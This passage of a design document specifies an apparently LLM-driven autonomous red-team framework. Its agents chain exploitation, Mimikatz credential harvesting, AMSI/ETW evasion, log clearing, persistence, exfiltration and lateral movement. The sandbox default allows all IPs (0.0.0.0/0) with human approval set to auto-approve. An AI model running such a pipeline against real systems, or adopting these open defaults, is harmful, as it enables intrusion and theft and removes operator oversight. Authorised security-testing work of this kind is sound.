                log.error("recon_step_failed", step=idx, subagent=step["subagent"], error=str(e))
                return idx, {"error": str(e)}

        step_results = await asyncio.gather(*[run_step(i) for i in ready])
        for idx, result in step_results:
            results[idx] = result
            pending.discard(idx)

    return [r for r in results if r is not None]


async def _dispatch_subagent(step: dict, state: EngagementState) -> dict:
    """Call the right sub-agent based on step.subagent."""
    subagent = step["subagent"]
    args = step["args"]
    args["engagement_id"] = state.engagement_id

    if subagent == "portscan":
        return await portscan_subagent.ainvoke(args)
    elif subagent == "webenum":
        return await webenum_subagent.ainvoke(args)
    elif subagent == "subdomainenum":
        return await subdomainenum_subagent.ainvoke(args)
    elif subagent == "dnsenum":
        return await dnsenum_subagent.ainvoke(args)
    elif subagent == "vhostenum":
        return await vhostenum_subagent.ainvoke(args)
    else:
        raise ValueError(f"Unknown subagent: {subagent}")
```

**Termination:**
- Plan complete → EXIT success
- 3 consecutive tool failures → EXIT with partial findings
- Iteration cap (20) hit → EXIT with partial findings
- Operator interrupt (Ctrl-C) → save state, EXIT

**Writes to state:** `hosts`, `services`, `web_apps`, `subdomains`, `directories`, `phase` (→ "vuln")

### 6.2 Vuln Agent

**Mission:** Identify vulnerabilities, produce 3-5 ranked attack hypotheses.

**Vuln Agent Prompt (Sonnet, hypothesis generation):**

```python
VULN_HYPOTHESES_PROMPT = """You are the Vuln Agent in AutoRed.
Given recon findings, produce 3-5 ranked attack hypotheses.

Recon findings:
- Hosts: {hosts_summary}
- Services: {services_summary}
- Web apps: {web_apps_summary}
- Vulnerabilities from nuclei: {nuclei_findings}
- CVEs from NVD match: {cve_matches}

Past similar engagements (from cross-engagement memory):
{chroma_results}

Available exploit tools (Phase 3+):
- sqlmap (SQL injection)
- hydra (brute force)
- metasploit (known CVEs)
- impacket (Windows lateral)
- custom (arbitrary commands)

For each hypothesis, return JSON with this exact schema:
{{
  "hypotheses": [
    {{
      "rank": 1,
      "target": "10.10.10.5",
      "technique": "EternalBlue (MS17-010)",
      "cve": "CVE-2017-0144",
      "expected_outcome": "SYSTEM shell as nt authority\\\\system",
      "tool": "metasploit",
      "tool_module": "exploit/windows/smb/ms17_010_eternalblue",
      "confidence": 0.85,
      "rationale": "SMB service on port 445 reports Windows XP. EternalBlue affects...",
      "prerequisites": [],
      "risks": ["may crash SMB service", "high detection likelihood"]
    }}
  ]
}}

Rules:
- Cite real CVEs only. If you're unsure, say so in confidence.
- Use real Metasploit module paths if you reference Metasploit.
- Rank by (exploitability × impact × confidence), highest first
- If no viable hypotheses, return {{"hypotheses": []}} and explain why
"""
```

**Self-critique prompt (DeepSeek):**

```python
VULN_CRITIQUE_PROMPT = """You are a senior red teamer reviewing a junior's attack plan.
For each hypothesis, find flaws:

Hypotheses:
{hypotheses_json}

For each hypothesis, check:
1. Is the cited CVE real? (look it up if uncertain)
2. Does the CVE actually affect the target service/version?
3. Is the Metasploit module path correct?
4. Are the risks understated?
5. Is the confidence justified?

Return JSON:
{{
  "critique": [
    {{
      "rank": 1,
      "issues": ["issue 1", "issue 2"],
      "verdict": "sound" | "needs_revision" | "discard",
      "verdict_reason": "..."
    }}
  ]
}}
"""
```

**Vuln Agent node implementation:**

```python
async def vuln_node(state: EngagementState) -> dict:
    log.info("vuln_start", engagement_id=state.engagement_id)

    # Step 1: Query CVEMatcher for each service (parallel)
    cve_matches = await _query_cves_for_services(state.services)

    # Step 2: Query ExploitFinder for each finding (parallel)
    exploit_matches = await _query_exploits_for_findings(state.vulnerabilities)

    # Step 3: Query Chroma for similar past findings
    chroma_results = _query_chroma_for_similar(state.services)

    # Step 4: Sonnet generates hypotheses
    model = get_model("synthesize_findings")
    prompt = VULN_HYPOTHESES_PROMPT.format(
        hosts_summary=_summarize_hosts(state.hosts),
        services_summary=_summarize_services(state.services),
        web_apps_summary=_summarize_web_apps(state.web_apps),
        nuclei_findings=_summarize_nuclei(state.vulnerabilities),
        cve_matches=cve_matches,
        chroma_results=chroma_results,
    )
    response = await model.ainvoke(prompt)
    hypotheses = _parse_hypotheses(response.content)

    # Step 5: Self-critique loop (max 3 iterations)
    for iteration in range(3):
        critique = await _run_critique(hypotheses)
        if all(c["verdict"] == "sound" for c in critique):
            break
        hypotheses = await _revise_hypotheses(hypotheses, critique)

    # Step 6: Sort by rank
    hypotheses.sort(key=lambda h: h["rank"])

    log.info("vuln_done", hypotheses_count=len(hypotheses))

    return {
        "vulnerabilities": state.vulnerabilities + _extract_vulns(cve_matches, exploit_matches),
        "attack_hypotheses": hypotheses,
        "phase": "exploit",
        "iteration_count": state.iteration_count + 1,
    }
```

**Writes to state:** `vulnerabilities`, `attack_hypotheses`, `phase` (→ "exploit")

### 6.3 Exploit Agent

**Mission:** Execute top-ranked hypothesis to achieve foothold.

**HitL gate prompt (operator-facing, via `hitl_summary` model):**

```python
HITL_EXPLOIT_PROMPT = """You are preparing a human-in-the-loop summary for the operator.
The agent wants to execute the following exploit hypothesis. Summarize it clearly.

Hypothesis:
{hypothesis_json}

Operator will see this and choose:
[y] approve  [n] reject  [e] edit  [s] skip to next hypothesis

Format the summary as:
---
EXPLOIT PROPOSAL #{rank}
Target: {target}
Technique: {technique}
CVE: {cve}
Tool: {tool} ({tool_module})
Expected outcome: {expected_outcome}
Confidence: {confidence}
Risks: {risks}

Command to execute:
{command}
---
"""
```

**Exploit Agent node implementation:**

```python
async def exploit_node(state: EngagementState) -> dict:
    log.info("exploit_start", engagement_id=state.engagement_id)

    hypotheses = sorted(state.attack_hypotheses, key=lambda h: h["rank"])
    tried_hypotheses = {h["rank"] for h in state.errors if h.get("category") == "exploit_failed"}

    for hypothesis in hypotheses:
        if hypothesis["rank"] in tried_hypotheses:
            continue

        # HitL gate (or auto-approve in sandbox)
        approved, modified_command = await _hitl_gate(hypothesis, state.rules_of_engagement)
        if not approved:
            log.info("exploit_hypothesis_rejected", rank=hypothesis["rank"])
            continue

        # Translate hypothesis to tool calls
        tool_calls = await _plan_exploit_execution(hypothesis, modified_command, state)

        # Execute via sub-agent
        try:
            result = await _dispatch_exploit_subagent(hypothesis["tool"], tool_calls, state)

            # Verify foothold
            if await _verify_foothold(result, state):
                log.info("exploit_success", rank=hypothesis["rank"])
                return {
                    "footholds": state.footholds + [_build_foothold(hypothesis, result)],
                    "evidence_paths": state.evidence_paths + result.evidence_paths,
                    "phase": "postex",
                    "iteration_count": state.iteration_count + 1,
                }
            else:
                log.warning("exploit_no_foothold", rank=hypothesis["rank"])
        except Exception as e:
            log.error("exploit_failed", rank=hypothesis["rank"], error=str(e))
            # Record in errors and try next

    # All hypotheses exhausted
    log.warning("exploit_all_failed")
    return {
        "phase": "report",
        "errors": state.errors + [ErrorEvent(
            timestamp=datetime.utcnow(),
            agent="exploit",
            category="hitl",
            message="All exploit hypotheses exhausted",
            context={"hypotheses_tried": list(tried_hypotheses)},
            recovered=False,
        )],
    }
```

**Sub-agents:** `SQLiAgent` (wraps sqlmap), `BruteAgent` (wraps hydra + medusa), `MSFAgent` (wraps Metasploit RPC), `CustomAgent` (executes approved arbitrary commands).

**Writes to state:** `footholds`, `evidence_paths`, `phase` (→ "postex" on success, "report" on failure)

### 6.4 Post-Ex Agent (Six Sub-Activities)

**Mission:** Enumerate foothold, escalate privileges, establish persistence, evade defenses, exfiltrate proof.

**Post-Ex Agent node implementation (skeleton):**

```python
async def postex_node(state: EngagementState) -> dict:
    log.info("postex_start", engagement_id=state.engagement_id)

    for foothold in state.footholds:
        # Sub-activity 1: Enumeration (auto-run, no gate)
        enum_results = await _run_enumeration(foothold, state)

        # Sub-activity 2: Privilege Escalation (HitL gate per attempt)
        privesc_results = await _run_privesc(foothold, enum_results, state)

        # Sub-activity 3: Persistence (HitL gate, if RoE allows)
        if state.rules_of_engagement.persistence_allowed:
            persist_results = await _run_persistence(foothold, state)

        # Sub-activity 4: Defense Evasion (HitL gate, if RoE allows)
        if state.rules_of_engagement.evasion_allowed:
            evasion_results = await _run_evasion(foothold, state)

        # Sub-activity 5: Data Exfiltration (HitL gate, if RoE allows)
        if state.rules_of_engagement.exfiltration_allowed:
            exfil_results = await _run_exfiltration(foothold, state)

    return {
        "local_users": state.local_users + enum_results.users,
        "harvested_secrets": state.harvested_secrets + enum_results.secrets + privesc_results.secrets,
        "trust_relationships": state.trust_relationships + enum_results.trusts,
        "privesc_candidates": state.privesc_candidates + enum_results.privesc_candidates,
        "privesc_attempts": state.privesc_attempts + privesc_results.attempts,
        "persistence_artifacts": state.persistence_artifacts + persist_results.artifacts,
        "evasion_actions": state.evasion_actions + evasion_results.actions,
        "exfiltration_proof": state.exfiltration_proof + exfil_results.proofs,
        "phase": "lateral",
        "iteration_count": state.iteration_count + 1,
    }
```

**Sub-activity 2: Privesc classification (decision logic):**

```python
PRIVESC_RISK_CATEGORIES = {
    "misconfig": {
        "examples": ["sudo_nopasswd", "suid_binary", "writable_passwd", "writable_service_path"],
        "risk": "low",
        "auto_attempt": True,
        "roe_key": None,  # no RoE check needed
    },
    "app_system": {
        "examples": ["dirty_pipe", "dirty_cow", "polkit_pkexec", "service_exploit"],
        "risk": "medium",
        "auto_attempt": False,
        "roe_key": None,
        "hitl_required": True,
    },
    "kernel": {
        "examples": ["kernel_panics", "kernel_oops", "bsod"],
        "risk": "high",
        "auto_attempt": False,
        "roe_key": "kernel_exploits_allowed",
        "hitl_required": True,
    },
}

async def _run_privesc(foothold, enum_results, state):
    candidates = enum_results.privesc_candidates
    attempts = []

    for candidate in candidates:
        category = _classify_privesc(candidate)
        config = PRIVESC_RISK_CATEGORIES[category]

        # RoE check (for kernel)
        if config["roe_key"] and not getattr(state.rules_of_engagement, config["roe_key"]):
            log.info("privesc_skipped_by_roe", candidate=candidate.technique, roe_key=config["roe_key"])
            continue

        # HitL gate (if required and not auto-approve)
        if config["hitl_required"] and state.rules_of_engagement.hitl_mode != "auto_approve":
            approved = await _hitl_privesc_gate(candidate, config["risk"])
            if not approved:
                continue

        # Execute
        attempt = await _execute_privesc(candidate, foothold, state)
        attempts.append(attempt)

        if attempt.success:
            # Re-run enumeration as elevated user
            elevated_enum = await _run_enumeration(foothold, state, elevated=True)
            # Update foothold context
            break  # don't try more privesc once we have elevated

    return PrivescResults(attempts=attempts, secrets=_extract_new_secrets(attempts))
```

**Sub-activity 3: Persistence — artifact tracking:**

```python
class PersistenceArtifact(BaseModel):
    id: str
    host: str
    method: Literal["cron", "systemd", "bashrc", "ssh_authorized_keys",
                    "scheduled_task", "registry_run", "service", "wmi_subscription", "dll_hijack"]
    details: dict          # method-specific: cron schedule, task name, etc.
    removal_command: str   # exact command to remove this artifact
    created_at: datetime
    foothold_id: str       # which foothold established this
```

Every persistence action creates a `PersistenceArtifact` with the **exact removal command**. Cleanup Agent runs these verbatim.

**Sub-activity 4: Evasion — RoE enforcement:**

```python
async def _run_evasion(foothold, state):
    if not state.rules_of_engagement.evasion_allowed:
        log.info("evasion_skipped_by_roe")
        return EvasionResults(actions=[])

    # Check Defender / AV status first
    av_status = await _check_av_status(foothold, state)

    actions = []
    for technique in _select_evasion_techniques(av_status):
        if state.rules_of_engagement.hitl_mode != "auto_approve":
            approved = await _hitl_evasion_gate(technique)
            if not approved:
                continue

        action = await _execute_evasion(technique, foothold, state)
        actions.append(action)

    return EvasionResults(actions=actions)
```

**Writes to state:** `local_users`, `harvested_secrets`, `trust_relationships`, `privesc_candidates`, `privesc_attempts`, `persistence_artifacts`, `evasion_actions`, `exfiltration_proof`, `phase` (→ "lateral")

### 6.5 Lateral Agent

**Mission:** Pivot to next host, spawn sub-engagement.

**Lateral Agent node implementation:**

```python
async def lateral_node(state: EngagementState) -> dict:
    log.info("lateral_start", engagement_id=state.engagement_id)

    # Step 1: Identify pivot candidates
    candidates = _identify_pivot_candidates(state.harvested_secrets, state.trust_relationships, state.hosts)
    candidates.sort(key=lambda c: c.confidence, reverse=True)

    pivots = []
    sub_engagements = []
    tunnels = []

    for candidate in candidates:
        # HitL gate (or auto-approve)
        if state.rules_of_engagement.hitl_mode != "auto_approve":
            approved = await _hitl_lateral_gate(candidate)
            if not approved:
                continue

        # Execute pivot
        pivot = await _execute_pivot(candidate, state)
        if not pivot.success:
            continue
        pivots.append(pivot)

        # Optional: set up tunnel
        if pivot.needs_tunnel:
            tunnel = await _setup_tunnel(pivot, state)
            tunnels.append(tunnel)

        # Spawn sub-engagement (recursive LangGraph)
        sub_engagement_id = f"{state.engagement_id}_sub_{len(sub_engagements)+1:02d}"
        sub_state = await _spawn_sub_engagement(
            parent_state=state,
            sub_id=sub_engagement_id,
            target_host=pivot.target_host,
            pivot_method=pivot.method,
            credentials=pivot.credentials_used,
        )
        sub_engagements.append(SubEngagementRef(
            sub_id=sub_engagement_id,
            target_host=pivot.target_host,
            pivot_method=pivot.method,
            status="completed" if sub_state.phase == "done" else "failed",
            summary=sub_state.summary,
            sub_state_path=f"engagements/{sub_engagement_id}/state.json",
        ))

    return {
        "pivots": state.pivots + pivots,
        "tunnels": state.tunnels + tunnels,
        "sub_engagements": state.sub_engagements + sub_engagements,
        "phase": "cleanup",
        "iteration_count": state.iteration_count + 1,
    }
```

**Pivot candidate identification:**

```python
def _identify_pivot_candidates(secrets, trusts, known_hosts) -> list[PivotCandidate]:
    """Find (cred, target_host, method) triples for lateral movement."""
    candidates = []
    known_host_ips = {h.ip for h in known_hosts}

    for secret in secrets:
        for trust in trusts:
            if trust.host != secret.source_host:
                # Can we use this secret on this host?
                method = _select_pivot_method(secret, trust)
                if method and trust.host not in known_host_ips:
                    candidates.append(PivotCandidate(
                        credential=secret,
                        target_host=trust.host,
                        method=method,
                        confidence=_calculate_confidence(secret, trust, method),
                    ))
    return candidates
```

**Writes to state:** `pivots`, `tunnels`, `sub_engagements`, `phase` (→ "cleanup")

### 6.6 Cleanup Agent

**Mission:** Remove all artifacts.

**Cleanup Agent node implementation:**

```python
async def cleanup_node(state: EngagementState) -> dict:
    log.info("cleanup_start", engagement_id=state.engagement_id)

    # Step 1: Collect all artifacts
    artifacts = state.persistence_artifacts
    tunnels = state.tunnels
    temp_files = _identify_temp_files(state.evidence_paths)

    cleanup_plan = _generate_cleanup_plan(artifacts, tunnels, temp_files)

    # Step 2: HitL gate (operator confirms)
    if state.rules_of_engagement.hitl_mode != "auto_approve":
        approved = await _hitl_cleanup_gate(cleanup_plan)
        if not approved:
            log.warning("cleanup_rejected_by_operator")
            return {"phase": "report"}

    # Step 3: Execute cleanup via sub-agents (parallel per host)
    cleanup_results = await asyncio.gather(*[
        _cleanup_host(host_artifacts, state) for host_artifacts in cleanup_plan.by_host
    ])

    # Step 4: Verify removal
    verification = await asyncio.gather(*[
        _verify_cleanup(host_artifacts, state) for host_artifacts in cleanup_plan.by_host
    ])

    failed_cleanups = [v for v in verification if not v.all_removed]
    if failed_cleanups:
        log.error("cleanup_failures", count=len(failed_cleanups))

    return {
        "cleanup_results": cleanup_results + verification,
        "phase": "report",
        "iteration_count": state.iteration_count + 1,
    }
```

**Writes to state:** `cleanup_results`, `phase` (→ "report")

### 6.7 Report Agent

**Mission:** Generate deliverable.

**Report Agent node implementation:**

```python
async def report_node(state: EngagementState) -> dict:
    log.info("report_start", engagement_id=state.engagement_id)

    # Step 1: Generate executive summary
    exec_summary = await _generate_exec_summary(state)

    # Step 2: Generate technical report
    tech_report = await _generate_tech_report(state)

    # Step 3: MITRE ATT&CK mapping
    mitre_map = await _generate_mitre_map(state)

    # Step 4: Combine into markdown
    markdown = _assemble_markdown_report(exec_summary, tech_report, mitre_map, state)

    # Step 5: Save markdown + render PDF
    md_path = Path(f"engagements/{state.engagement_id}/report.md")
    md_path.write_text(markdown)

    pdf_path = await _render_pdf(markdown, state.engagement_id)

    # Step 6: Extract lessons for cross-engagement memory
    lessons = await _extract_lessons(state)
    await _store_lessons_in_chroma(lessons)
    await _store_lessons_in_sqlite(lessons, state.engagement_id)

    # Step 7: Save lessons.json
    lessons_path = Path(f"engagements/{state.engagement_id}/lessons.json")
    lessons_path.write_text(json.dumps([l.dict() for l in lessons], indent=2))

    log.info("report_done", md_path=str(md_path), pdf_path=str(pdf_path))

    return {
        "phase": "done",
        "iteration_count": state.iteration_count + 1,
    }
```

**Writes to disk:** `report.md`, `report.pdf`, `lessons.json`. Writes to state: `phase` (→ "done")

### 6.8 RoE Guard (Non-LLM)

**Implementation:**

```python
# autored/roe_guard.py
from functools import wraps
from typing import Callable, Literal
from pydantic import BaseModel
from autored.logging import get_logger
from autored.state import RulesOfEngagement

log = get_logger("roe_guard")

ToolCategory = Literal[
    "recon", "read_only",           # Phase 1
    "vuln_scan", "cve_query",       # Phase 2
    "exploit", "brute_force",       # Phase 3
    "privesc_misconfig", "privesc_app", "privesc_kernel",  # Phase 4
    "persistence", "evasion", "exfil",  # Phase 4
    "lateral", "tunnel",            # Phase 5
    "cleanup",                      # Phase 5
    "data_destruction",             # always blocked
]

class RoEViolation(Exception):
    def __init__(self, reason: str, action: dict):
        self.reason = reason
        self.action = action
        super().__init__(f"RoE violation: {reason}")

def roe_guard(allowed_categories: list[ToolCategory]):
    """Decorator that enforces RoE on a tool function."""
    def decorator(func):
        @wraps(func)
        async def wrapper(*args, **kwargs):
            # Extract engagement state from kwargs
            state = kwargs.get("engagement_id")
            # In production: look up RoE from engagement_id
            # For now, assume state is passed

            # Get the RoE (mocked in tests, real in production)
            roe = _get_roe_for_engagement(kwargs.get("engagement_id", ""))

            # Determine the category of this call
            category = _categorize_call(func.__name__, kwargs)

            # Check if category is in allowed_categories
            if category not in allowed_categories:
                raise RoEViolation(
                    f"Tool {func.__name__} not allowed for category {category}",
                    {"tool": func.__name__, "category": category, "kwargs": kwargs},
                )

            # Check RoE rules
            check_result = _check_roe_rules(roe, category, kwargs)
            if not check_result.allowed:
                log.warning("roe_violation",
                            tool=func.__name__,
                            reason=check_result.reason,
                            kwargs=kwargs)
                raise RoEViolation(check_result.reason, {"tool": func.__name__, **kwargs})

            # Audit log
            log.info("roe_audit",
                     tool=func.__name__,
                     category=category,
                     target=kwargs.get("target", ""),
                     allowed=True)

            # Execute
            return await func(*args, **kwargs)
        return wrapper
    return decorator

class RoECheckResult(BaseModel):
    allowed: bool
    reason: str | None = None

def _check_roe_rules(roe: RulesOfEngagement, category: ToolCategory, kwargs: dict) -> RoECheckResult:
    # Hard limits (always blocked)
    if category == "data_destruction":
        return RoECheckResult(allowed=False, reason="data destruction always blocked")

    # Category-specific checks
    if category == "persistence" and not roe.persistence_allowed:
        return RoECheckResult(allowed=False, reason="persistence not allowed per RoE")
    if category == "evasion" and not roe.evasion_allowed:
        return RoECheckResult(allowed=False, reason="evasion not allowed per RoE")
    if category == "exfil" and not roe.exfiltration_allowed:
        return RoECheckResult(allowed=False, reason="exfiltration not allowed per RoE")
    if category == "privesc_kernel" and not roe.kernel_exploits_allowed:
        return RoECheckResult(allowed=False, reason="kernel exploits not allowed per RoE")

    # IP scope check (for tools that take a target)
    target = kwargs.get("target")
    if target and not _ip_in_scope(target, roe.allowed_ips):
        return RoECheckResult(allowed=False, reason=f"target {target} not in allowed_ips")

    return RoECheckResult(allowed=True)

def _ip_in_scope(target: str, allowed_ips: list[str]) -> bool:
    """Check if target IP/hostname is in allowed_ips list."""
    import ipaddress
    # If allowed_ips contains "*", allow everything
    if "*" in allowed_ips:
        return True

    try:
        target_ip = ipaddress.ip_address(target)
        for allowed in allowed_ips:
            try:
                if "/" in allowed:
                    network = ipaddress.ip_network(allowed, strict=False)
                    if target_ip in network:
                        return True
                else:
                    if target_ip == ipaddress.ip_address(allowed):
                        return True
            except ValueError:
                continue
        return False
    except ValueError:
        # target is a hostname, not IP
        # Check if it matches any allowed hostname (simplified)
        return any(target == allowed or target.endswith("." + allowed) for allowed in allowed_ips if not _is_ip(allowed))

def _is_ip(s: str) -> bool:
    import ipaddress
    try:
        ipaddress.ip_address(s)
        return True
    except ValueError:
        try:
            ipaddress.ip_network(s, strict=False)
            return True
        except ValueError:
            return False
```

---

## 7. Subagent Architecture & Communication

### 7.1 Three-Layer Hierarchy

```
Layer 0: Orchestrator (Master) — non-LLM, pure control flow
Layer 1: Primary Agents (8, LLM-driven)
Layer 2: Specialist Sub-Agents (27, narrow-purpose, short-lived)
```

### 7.2 Five Communication Patterns

#### Pattern 1 — Sequential via Shared State (Default, Primary → Primary)

Agents never call each other. Data flows through `EngagementState`. Orchestrator decides sequencing.

#### Pattern 2 — Subgraph Spawn (Lateral Recursion)

Sub-engagement has own `engagement_id`, own folder, own checkpoint DB. Parent gets `SubEngagementRef` summary.

#### Pattern 3 — Consultation Call (Primary → Specialist Sub-Agent)

Sub-agents are `@tool`-decorated functions. Primary agent calls them like functions. Sub-agent may make LLM calls internally; primary agent doesn't know.

#### Pattern 4 — Parallel Fan-Out (Primary → Multiple Sub-Agents)

Sub-agents must be **stateless and independent**. They receive inputs as args, return outputs as values. Primary agent handles state mutation.

#### Pattern 5 — Event Stream (Future Enhancement, Not in Any Phase)

Pub/sub bus for **multi-engagement** orchestration (running 3 engagements simultaneously, monitoring all from one view). The TUI's single-engagement real-time updates use Pattern 3 (event bus, §17.7), not this pattern.

Not in Phases 1-6. Adds complexity, not needed until you're running multiple engagements concurrently.

### 7.3 Communication Protocol Rules (Non-Negotiable)

| # | Rule |
|---|---|
| 1 | Primary agents never call each other directly |
| 2 | Sub-agents never read/write EngagementState directly |
| 3 | Every inter-agent message is typed (Pydantic) |
| 4 | Sub-agents are stateless |
| 5 | Sub-agents have a max execution time (default 5 min) |
| 6 | No agent knows another agent's prompt or model |
| 7 | Every agent invocation is logged with full input/output |
| 8 | Sub-engagement state is owned by the sub-engagement |
| 9 | Orchestrator is non-LLM |
| 10 | RoE Guard has veto power over every agent action |

### 7.4 Complete Sub-Agent Inventory (27 Total)

| Primary Agent | Sub-Agent | File | Mission | Phase |
|---|---|---|---|---|
| **Recon** | PortScan | `subagents/portscan.py` | Run naabu + nmap, return `NmapResult` | 1 |
| **Recon** | WebEnum | `subagents/webenum.py` | Run httpx + feroxbuster + nuclei (web), return combined | 1 |
| **Recon** | SubdomainEnum | `subagents/subdomainenum.py` | Run subfinder + amass, merge results | 1 |
| **Recon** | DNSEnum | `subagents/dnsenum.py` | Run dnsx, return `DnsResult` | 1 |
| **Recon** | VhostEnum | `subagents/vhostenum.py` | Run gobuster vhost | 1 |
| **Vuln** | CVEMatcher | `subagents/cvematcher.py` | Query NVD for service+version → CVE list | 2 |
| **Vuln** | ExploitFinder | `subagents/exploitfinder.py` | Query ExploitDB for CVE → exploit references | 2 |
| **Vuln** | HypothesisCritic | `subagents/hypothesiscritic.py` | DeepSeek critiques Sonnet's hypotheses | 2 |
| **Exploit** | SQLiAgent | `subagents/sqliagent.py` | Wraps sqlmap, manages sessions | 3 |
| **Exploit** | BruteAgent | `subagents/bruteagent.py` | Wraps hydra/medusa, manages wordlists | 3 |
| **Exploit** | MSFAgent | `subagents/msfagent.py` | Wraps Metasploit RPC | 3 |
| **Exploit** | CustomAgent | `subagents/customagent.py` | Executes approved arbitrary commands | 3 |
| **Post-Ex** | LinuxEnum | `subagents/linuxenum.py` | Run linpeas + manual checks, parse | 4 |
| **Post-Ex** | WindowsEnum | `subagents/windowsenum.py` | Run winpeas + Seatbelt + PowerUp, parse | 4 |
| **Post-Ex** | PrivescFinder | `subagents/privescfinder.py` | Analyze enum results → privesc candidates | 4 |
| **Post-Ex** | CredHarvester | `subagents/credharvester.py` | Mimikatz, secrets dump, LSASS | 4 |
| **Post-Ex** | PersistenceAgent | `subagents/persistenceagent.py` | Establish + track persistence artifacts | 4 |
| **Post-Ex** | EvasionAgent | `subagents/evasionagent.py` | AMSI bypass, ETW patch, log clear | 4 |
| **Post-Ex** | ExfilAgent | `subagents/exfilagent.py` | HTTPS/DNS/ICMP exfil to catch server | 4 |
| **Lateral** | PivotExecutor | `subagents/pivotexecutor.py` | Execute pivot (wmiexec, psexec, ssh, etc.) | 5 |
| **Lateral** | TunnelSetup | `subagents/tunnelsetup.py` | Setup chisel/ligolo/proxychains | 5 |
| **Cleanup** | ArtifactRemover | `subagents/artifactremover.py` | Execute removal commands for artifacts | 5 |
| **Cleanup** | VerificationScanner | `subagents/verificationscanner.py` | Re-scan to verify artifacts removed | 5 |
| **Report** | ExecSummaryWriter | `subagents/execsummarywriter.py` | Generate 1-page non-technical summary | 6 |
| **Report** | TechReportWriter | `subagents/techreportwriter.py` | Generate full technical report | 6 |
| **Report** | MITREMapper | `subagents/mitremapper.py` | Map findings to ATT&CK technique IDs | 6 |
| **Report** | LessonExtractor | `subagents/lessonextractor.py` | Extract lessons for cross-engagement memory | 6 |

### 7.5 Sub-Agent Implementation Template

```python
# autored/subagents/portscan.py
from pydantic import BaseModel, Field
from langchain_core.tools import tool
from autored.tools.nmap import nmap_scan, NmapResult
from autored.tools.naabu import naabu_scan, PortList
from autored.logging import get_logger

log = get_logger("subagents.portscan")

class PortScanInput(BaseModel):
    target: str
    scan_type: str = "quick"        # "quick", "full", "service"
    engagement_id: str

class PortScanOutput(BaseModel):
    target: str
    fast_scan: PortList | None = None
    deep_scan: NmapResult | None = None

@tool
async def portscan_subagent(target: str, scan_type: str = "quick", engagement_id: str = "") -> PortScanOutput:
    """Run port scan: naabu for fast sweep, then nmap for deep service scan.

    Args:
        target: IP, CIDR, or hostname
        scan_type: "quick" (top 100), "full" (all ports), "service" (service detection)
        engagement_id: Current engagement ID

    Returns:
        PortScanOutput with fast_scan (naabu) and deep_scan (nmap) results
    """
    log.info("portscan_start", target=target, scan_type=scan_type)

    # Step 1: Fast port sweep with naabu
    fast_scan = await naabu_scan.ainvoke({
        "target": target,
        "ports": "top-1000",
        "engagement_id": engagement_id,
    })

    # Step 2: Determine open ports
    open_ports = [p.port for p in fast_scan.ports if p.state == "open"]
    if not open_ports:
        log.info("portscan_no_open_ports", target=target)
        return PortScanOutput(target=target, fast_scan=fast_scan)

    # Step 3: Deep scan with nmap on open ports
    ports_str = ",".join(str(p) for p in open_ports[:100])  # cap at 100 ports
    deep_scan = await nmap_scan.ainvoke({
        "target": target,
        "scan_type": "service",
        "ports": ports_str,
        "engagement_id": engagement_id,
    })

    log.info("portscan_done", target=target, open_ports=len(open_ports))
    return PortScanOutput(target=target, fast_scan=fast_scan, deep_scan=deep_scan)
```

---

## 8. RoE Guard & Sandbox Configuration

### 8.1 RoE Config Format (YAML)

```yaml
# roe.yaml — Rules of Engagement for an engagement
engagement_name: "HTB Lame - September 2026"
operator: "operator_name"
operator_signature: "<signed hash for audit>"

# Scope
allowed_ips:
  - "10.10.10.5"
  - "10.10.10.0/24"
allowed_techniques:
  - "*"  # ["*"] allows any, or list specific MITRE ATT&CK IDs

# Activity permissions
persistence_allowed: true
evasion_allowed: true
exfiltration_allowed: true
data_destruction_allowed: false   # almost always False; the one hard limit
kernel_exploits_allowed: true

# HitL behavior
hitl_mode: "auto_approve"  # "always_ask" | "auto_approve" | "disabled"
```

### 8.2 Sandbox Default Config (`roe-sandbox.yaml`)

```yaml
engagement_name: "Sandbox Engagement"
operator: "operator"
operator_signature: "sandbox-mode"

allowed_ips:
  - "0.0.0.0/0"
allowed_techniques:
  - "*"

persistence_allowed: true
evasion_allowed: true
exfiltration_allowed: true
data_destruction_allowed: false
kernel_exploits_allowed: true

hitl_mode: "auto_approve"
```

### 8.3 RoE Wizard (Interactive YAML Generation)

```bash
$ autored roe-wizard
? Engagement name: HTB Lame Test
? Operator name: operator
? Allowed IPs (comma-separated): 10.10.10.5
? Allowed techniques (* for any): *
? Allow persistence? [y/N]: n
? Allow defense evasion? [y/N]: n
? Allow data exfiltration? [y/N]: n
? Allow kernel exploits? [y/N]: n
? HitL mode (always_ask/auto_approve/disabled) [always_ask]:
? Save to: roe-htb-lame.yaml
✓ RoE file saved to roe-htb-lame.yaml
```

---

## 9. EngagementState Schema

### 9.1 Main Schema

```python
# autored/state.py
from pydantic import BaseModel, Field
from datetime import datetime
from typing import Literal, Optional
from uuid import uuid4

class EngagementState(BaseModel):
    # Identity
    engagement_id: str = Field(default_factory=lambda: str(uuid4()))
    parent_engagement_id: Optional[str] = None
    target_scope: list[str]
    operator: str
    started_at: datetime = Field(default_factory=datetime.utcnow)
    phase: Literal["recon","vuln","exploit","postex","lateral","cleanup","report","done"] = "recon"

    # RoE
    rules_of_engagement: "RulesOfEngagement"

    # Recon findings (Phase 1)
    hosts: list["Host"] = Field(default_factory=list)
    services: list["Service"] = Field(default_factory=list)
    web_apps: list["WebApp"] = Field(default_factory=list)
    subdomains: list[str] = Field(default_factory=list)
    directories: list["DiscoveredPath"] = Field(default_factory=list)

    # Vuln findings (Phase 2+)
    vulnerabilities: list["Vulnerability"] = Field(default_factory=list)
    attack_hypotheses: list["AttackHypothesis"] = Field(default_factory=list)

    # Exploitation (Phase 3+)
    footholds: list["Foothold"] = Field(default_factory=list)
    credentials: list["Credential"] = Field(default_factory=list)

    # Post-Ex (Phase 4+)
    local_users: list["User"] = Field(default_factory=list)
    harvested_secrets: list["Secret"] = Field(default_factory=list)
    trust_relationships: list["Trust"] = Field(default_factory=list)
    privesc_candidates: list["PrivescCandidate"] = Field(default_factory=list)
    privesc_attempts: list["PrivescAttempt"] = Field(default_factory=list)
    persistence_artifacts: list["PersistenceArtifact"] = Field(default_factory=list)
    evasion_actions: list["EvasionAction"] = Field(default_factory=list)
    exfiltration_proof: list["ExfilEvidence"] = Field(default_factory=list)

    # Lateral (Phase 5+)
    movement_paths: list["MovementPath"] = Field(default_factory=list)
    pivots: list["PivotRecord"] = Field(default_factory=list)
    tunnels: list["TunnelConfig"] = Field(default_factory=list)
    sub_engagements: list["SubEngagementRef"] = Field(default_factory=list)

    # Cleanup (Phase 5+)
    cleanup_results: list["CleanupResult"] = Field(default_factory=list)

    # Cross-cutting
